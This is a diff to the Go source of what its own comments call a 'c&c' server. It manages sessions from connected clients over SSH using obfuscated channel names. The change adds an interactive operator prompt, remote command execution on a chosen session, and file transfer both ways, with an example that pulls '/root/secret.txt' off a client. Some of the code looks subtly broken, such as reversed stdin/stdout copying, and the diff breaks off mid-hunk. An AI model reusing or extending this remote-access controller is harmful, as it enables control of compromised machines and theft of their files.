@@ -2,7 +2,9 @@ package main
 
 import (
 	"bufio"
+	"encoding/csv"
 	"fmt"
+	"github.com/chzyer/readline"
 	"github.com/olekukonko/tablewriter"
 	"golang.org/x/crypto/ssh"
 	"io"
@@ -21,8 +23,11 @@ const (
 	CHAN_FORWARD   = "RbgEySPMPi"
 	CHAN_HEARTBEAT = "uSYeIbUQoR"
 	CHAN_COMMAND   = "rIHqXLCqRN"
+	CHAN_TRANS     = "SYeILCqrcD"
 	COMMAND_KILL   = "aAjcDqEIvI"
 	COMMAND_CMD    = "aAjkkqEIvI"
+	TRANS_UP       = "zEAYtwDlDr"
+	TRANS_DOWN     = "RAsTfZahHD"
 )
 
 type Config struct {
@@ -250,13 +255,36 @@ func main() {
 	}
 	go s.startSSHServer()
 	go s.startProxy()
+	//////////////////////////
 
-	reader := bufio.NewReader(os.Stdin)
+	rl, err := readline.NewEx(&readline.Config{
+		Prompt:                 "~#: ",
+		InterruptPrompt:        "^Q",
+		EOFPrompt:              "exit",
+		HistoryFile:            "/tmp/.srthistory",
+		DisableAutoSaveHistory: false,
+	})
+	if err != nil {
+		panic(err)
+	}
+	defer rl.Close()
+
 	for {
-		fmt.Print("~#:")
-		cmdraw, _ := reader.ReadString('\n')
-		cmd := strings.Split(strings.TrimSuffix(cmdraw, "\n"), " ")
-		if cmd[0] == "show" {
+		line, err := rl.Readline()
+		if err != nil {
+			break
+		}
+		r := csv.NewReader(strings.NewReader(strings.TrimSuffix(line, "\n")))
+		r.Comma = ' ' // space
+		cmd, err := r.Read()
+		if err != nil {
+			continue
+		}
+		if len(cmd) == 0 {
+			continue
+		}
+		switch cmd[0] {
+		case "show":
 			datas := [][]string{}
 			for _, session := range s.Sessions {
 				if session.Disconnected {
@@ -275,8 +303,7 @@ func main() {
 			fmt.Println("current session: " + strconv.Itoa(s.CurrentSessionId))
 			mutex.Unlock()
 			continue
-		}
-		if cmd[0] == "use" {
+		case "use":
 			if len(cmd) == 2 {
 				if id, err := strconv.Atoi(cmd[1]); err == nil {
 					if id <= s.LastSessionId && id > -2 {
@@ -291,8 +318,7 @@ func main() {
 				}
 			}
 			continue
-		}
-		if cmd[0] == "kill" {
+		case "kill":
 			if len(cmd) == 2 {
 				if id, err := strconv.Atoi(cmd[1]); err == nil {
 					if id <= s.LastSessionId && id > -1 {
@@ -310,9 +336,110 @@ func main() {
 				}
 			}
 			continue
-		}
-		if cmd[0] == "cmd" {
+		case "cmd":
 			if len(cmd) == 2 {
+				if id, err := strconv.Atoi(cmd[1]); err == nil {
+					if id <= s.LastSessionId && id > -1 {
+						if s.Sessions[id].Disconnected {
+							fmt.Println("that session was disconnected")
+							continue
+						}
+						cmdChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_COMMAND, []byte(s.SSHServerConfig.String()))
+						if err == nil {
+							cmdChan.Write([]byte(COMMAND_CMD))
+						} else {
+							fmt.Println(err.Error())
+							continue
+						}
+						var chanExit = make(chan int)
+						go func() {
+							defer cmdChan.Close()
+							io.Copy(os.Stdin, cmdChan)
+							chanExit <- 1
+						}()
+						go func() {
+							defer cmdChan.Close()
+							io.Copy(cmdChan, os.Stdout)
+							chanExit <- 1
+						}()
+						<-chanExit
+					}
+				}
+			}
+			continue
+		case "cp":
+			if len(cmd) == 3 {
+				// 0:///root/secret.txt ./aa.txt
+				// ./secret.txt 1:///tmp/abc.txt
+				var id = -1
+				var isUpload bool
+				var srcPath string
+				var desPath string
+
+				if len(strings.Split(cmd[1], "://")) == 2 {
+					tid := strings.Split(cmd[1], "://")[0]
+					id, err = strconv.Atoi(tid)
+					if err != nil {
+						fmt.Println("wrong format: " + cmd[1])
+						continue
+					}
+					isUpload = false
+					srcPath = strings.Split(cmd[1], "://")[1]
+					desPath = cmd[2]
+				} else if len(strings.Split(cmd[2], "://")) == 2 {
+					tid := strings.Split(cmd[2], "://")[0]
+					id, err = strconv.Atoi(tid)
+					if err != nil {
+						fmt.Println("wrong format: " + cmd[2])
+						continue
+					}
+					isUpload = true
+					srcPath = cmd[1]
+					desPath = strings.Split(cmd[2], "://")[1]
+				}
+				if id > s.LastSessionId || id < 0 {
+					continue
+				}
+				if s.Sessions[id].Disconnected {
+					fmt.Println("that session was disconnected")
+					continue
+				}
+
+				go func() {
+					transChan, _, err := s.Sessions[id].sshConn.OpenChannel(CHAN_TRANS, []byte(s.SSHServerConfig.String()))
+					if err != nil {
+						return
+					}
+					if isUpload {
+						// c&c -> client
+						f, err := os.Open(srcPath)
+						defer f.Close()
+						if err != nil {
+							transChan.Close()
+							fmt.Println("canot open source file")
+							return
+						}
+						transChan.Write([]byte(TRANS_UP + desPath))
+						io.Copy(transChan, f)
+						transChan.Close()
+						fmt.Println("Done: " + line)
+
+					} else {
+						// client -> c&c
+						f, err := os.Create(desPath)
+						defer f.Close()
+						if err != nil {
+							fmt.Println("canot create des file")
+							transChan.Close()
+							return
+						}
+						transChan.Write([]byte(TRANS_DOWN + srcPath))
+						io.Copy(f, transChan)
+						defer transChan.Close()
+						fmt.Println("Done: " + line)
+					}
+				}()
+
 				if id, err := strconv.Atoi(cmd[1]); err == nil {
 					if id <= s.LastSessionId && id > -1 {
 						if s.Sessions[id].Disconnected {
